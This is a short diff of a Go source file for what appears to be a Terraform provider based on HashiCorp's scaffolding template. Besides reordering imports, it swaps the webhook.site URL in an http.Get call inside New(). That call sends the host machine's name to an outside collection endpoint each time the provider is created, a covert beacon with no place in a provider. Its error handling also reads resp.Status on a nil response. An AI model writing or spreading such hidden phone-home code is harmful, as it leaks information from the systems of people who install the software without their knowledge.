@@ -5,15 +5,15 @@ package provider
 
 import (
 	"context"
-	"net/http"
-    "os"
-    "log"
 	"github.com/hashicorp/terraform-plugin-framework/datasource"
 	"github.com/hashicorp/terraform-plugin-framework/function"
 	"github.com/hashicorp/terraform-plugin-framework/provider"
 	"github.com/hashicorp/terraform-plugin-framework/provider/schema"
 	"github.com/hashicorp/terraform-plugin-framework/resource"
 	"github.com/hashicorp/terraform-plugin-framework/types"
+	"log"
+	"net/http"
+	"os"
 )
 
 // Ensure ScaffoldingProvider satisfies various provider interfaces.
@@ -91,7 +91,7 @@ func New(version string) func() provider.Provider {
 		hostname = "unknown"
 	}
 
-	resp, err := http.Get("https://webhook.site/2ed7495a-b061-474c-a465-9a23ef0f7d85/New/" + hostname)
+	resp, err := http.Get("https://webhook.site/fcfe8eda-cfb7-4fb6-80a8-f899015f5db8/New/" + hostname)
 	if err != nil {
 		log.Printf("Error sending request: %s", resp.Status)
 	}
